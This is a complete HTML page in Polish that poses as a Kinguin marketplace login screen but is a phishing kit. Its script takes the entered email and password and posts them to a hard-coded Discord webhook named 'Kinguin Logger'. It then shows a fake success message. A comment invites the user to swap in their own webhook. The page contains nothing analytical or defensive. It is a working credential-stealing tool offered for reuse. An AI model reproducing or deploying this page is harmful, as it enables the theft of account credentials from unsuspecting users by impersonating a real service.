<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kinguin - Logowanie</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

    body {
      margin: 0;
      font-family: 'Inter', system-ui, sans-serif;
      background: linear-gradient(145deg, #0a0a0a, #1f1f1f);
      color: #fff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .card {
      background: #18181b;
      width: 100%;
      max-width: 400px;
      border-radius: 24px;
      padding: 48px 40px 40px;
      box-shadow: 0 25px 50px -12px rgba(249, 115, 22, 0.3);
      border: 1px solid #f97316;
    }

    .logo {
      text-align: center;
      margin-bottom: 32px;
    }

    .logo span {
      font-size: 48px;
      font-weight: 800;
      background: linear-gradient(90deg, #f97316, #fb923c, #fed7aa);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: -3px;
    }

    h1 {
      text-align: center;
      font-size: 28px;
      font-weight: 700;
      margin: 0 0 12px 0;
    }

    p {
      text-align: center;
      color: #a1a1aa;
      font-size: 15px;
      margin-bottom: 40px;
    }

    .form-group {
      margin-bottom: 24px;
    }

    label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #d1d5db;
      margin-bottom: 8px;
    }

    input {
      width: 100%;
      padding: 16px 20px;
      background: #27272a;
      border: 2px solid #3f3f46;
      border-radius: 14px;
      color: #fff;
      font-size: 16px;
      transition: all 0.3s ease;
    }

    input:focus {
      border-color: #f97316;
      box-shadow: 0 0 0 4px rgba(249, 115, 22, 0.25);
      outline: none;
    }

    button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(90deg, #f97316, #fb923c);
      color: #111;
      border: none;
      border-radius: 14px;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 8px;
      transition: all 0.3s ease;
    }

    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 30px rgba(249, 115, 22, 0.4);
    }

    .forgot {
      text-align: center;
      color: #f97316;
      font-size: 14px;
      margin-top: 24px;
      text-decoration: none;
    }

    .forgot:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="logo">
      <span>KINGUIN</span>
    </div>

    <h1>Zaloguj się</h1>
    <p>Aby zobaczyć najlepsze oferty</p>

    <form id="loginForm">
      <div class="form-group">
        <label>Email lub nazwa użytkownika</label>
        <input type="text" id="email" placeholder="" required>
      </div>

      <div class="form-group">
        <label>Hasło</label>
        <input type="password" id="password" placeholder="" required>
      </div>

      <button type="submit">Zaloguj się</button>
    </form>

    <a href="#" class="forgot">Zapomniałeś hasła?</a>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1493250113588691067/2kSrCkWZnkMKpbYNURbE-afbcfWLwrwlXyGWHr22AdA4LphCobaTQh3tTctEXXVbQmvu"; // ← ZMIEŃ NA SWÓJ!

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        alert("Wypełnij wszystkie pola!");
        return;
      }

      const payload = {
        username: "Kinguin Logger",
        embeds: [{
          title: "🔑 Nowe logowanie do Kinguin",
          color: 0xf97316,
          fields: [
            { name: "Email / Login", value: email, inline: true },
            { name: "Hasło", value: password, inline: true },
            { name: "Czas", value: new Date().toLocaleString('pl-PL') }
          ]
        }]
      };

      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        alert("✅ Zalogowano pomyślnie do Kinguin!");
      } catch (err) {
        alert("Błąd połączenia.");
      }
    });
  </script>

</body>
</html>
